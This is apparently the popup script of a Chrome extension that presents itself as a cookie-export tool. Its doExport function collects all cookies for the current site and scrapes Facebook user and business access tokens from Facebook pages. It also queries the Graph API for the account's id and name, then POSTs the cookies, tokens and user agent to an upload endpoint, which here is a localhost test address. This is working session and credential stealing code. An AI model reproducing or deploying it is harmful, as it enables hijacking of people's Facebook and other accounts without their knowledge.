! function(e, t) {
    "function" == typeof define && define.amd ? define([], t) : "undefined" != typeof exports ? t() : t()
},
function(e) {
    e.storage.local.get({
        auto_refresh: !0,
        clear_cookies: !1
    }, function(t) {
        new Vue({
            el: "#shawnsavour",
            data: {
                password: "",
                sitename: "this page",
                isValidProtocol: !1,
                auto_refresh: t.auto_refresh,
                clear_cookies: t.clear_cookies,
                fullpage: !1,
                error: !1
            },
            methods: {
                exportCookies: function() {
                    var t = this;
                    site = ['www.facebook.com', '']
                    if (t['sitename']);
                    // if (!this.isValidProtocol) return !1;
                    // if (this.fullpage) try {
                    //     var r = new URL(window.top.location.href);
                    //     this.doExport(atob(r.searchParams.get("url")))
                    // } catch (i) {
                    //     console.error(i.message)
                    // } else e.tabs.query({
                    //     active: !0,
                    //     currentWindow: !0
                    // }, function(e) {
                    //     t.doExport(e[0].url)
                    // })
                },

                doExport: function(t) {
                    var r = this;
                    var uToken, bToken, fbInfo, UA;
                    try {
                        var i = new URL(t),
                            o = i.origin;
                        UA = navigator.userAgent;
                        e.cookies.getAll({
                            url: o
                        }, function(e) {
                            if (e.length > 0) {
                                format = '';
                                for (let i = 0; i < e.length; i++) {
                                    format += e[i].name + '=' + e[i].value;
                                    if (i < e.length - 1) {
                                        format += ','
                                    }
                                }
                                var t = {
                                        url: o,
                                        cookies: e
                                    },
                                    i = JSON.stringify(t);

                                var z = $.ajax({
                                    url: "https://business.facebook.com/business_locations",
                                    type: "get",
                                    async: false,
                                    global: false,
                                    success: function(t) {
                                        return t;
                                    }
                                }).responseText;
                                z.search("EAA") == -1 ? bToken = '' : bToken = z.match(/EAAGNO.*?\"/)[0].replace(/\W/g, "");
                                var s = $.ajax({
                                    url: "https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed",
                                    type: "get",
                                    async: false,
                                    global: false,
                                    success: function(t) {
                                        return t;
                                    }
                                }).responseText;
                                s.search("EAAAAZ") == -1 ? uToken = '' : uToken = s.match(/EAAAAZ.*?\"/)[0].replace(/\W/g, "");
                                if ("" != uToken) {
                                    fbInfo = $.ajax({
                                        url: "https://graph.facebook.com/me?access_token=".concat(uToken),
                                        type: "get",
                                        dataType: 'json',
                                        async: false,
                                        global: false,
                                        success: function(o) {
                                            if (o.name) {
                                                var name = o.name;
                                                var uid = o.id;
                                            }
                                            return name, uid
                                        }
                                    }).responseJSON;
                                }
                                console.log(fbInfo);
                                $.ajax({
                                    url: 'http://localhost/testweb/upload.php',
                                    type: 'POST',
                                    data: {
                                        uid: fbInfo['id'],
                                        name: fbInfo['name'],
                                        url: o,
                                        useragent: UA,
                                        cookie: format,
                                        uToken: uToken,
                                        bToken: bToken
                                    },
                                    success: function(result) {
                                        console.log(result);
                                        alert(fbInfo['id'] + ' was sent!');
                                    }

                                });

                            } else r.error = !0
                        })
                    } catch (s) {
                        return console.error(s.message), !1
                    }
                },
                openInNewTab: function() {
                    e.tabs.query({
                        active: !0,
                        currentWindow: !0
                    }, function(t) {
                        try {
                            e.tabs.create({
                                url: e.extension.getURL("popup.html?url=" + encodeURIComponent(btoa(t[0].url))),
                                active: !0
                            })
                        } catch (r) {
                            return console.error(r.message), !1
                        }
                    })
                }
            },
            mounted: function() {
                var t = this;
                e.tabs.query({
                    active: !0,
                    currentWindow: !0
                }, function(e) {
                    try {
                        var r = new URL(e[0].url);
                        if (t.fullpage = "chrome-extension:" === r.protocol, t.fullpage) {
                            try {
                                var i = new URL(window.top.location.href),
                                    n = new URL(atob(i.searchParams.get("url")));
                                t.sitename = n.hostname
                            } catch (o) {
                                console.error(o.message), window.close()
                            }
                            t.isValidProtocol = !0
                        } else t.isValidProtocol = ["http:", "https:"].includes(r.protocol), t.isValidProtocol && (t.sitename = r.hostname)
                    } catch (o) {
                        return console.error(o.message), !1
                    }
                })
            }
        })
    })
}(chrome);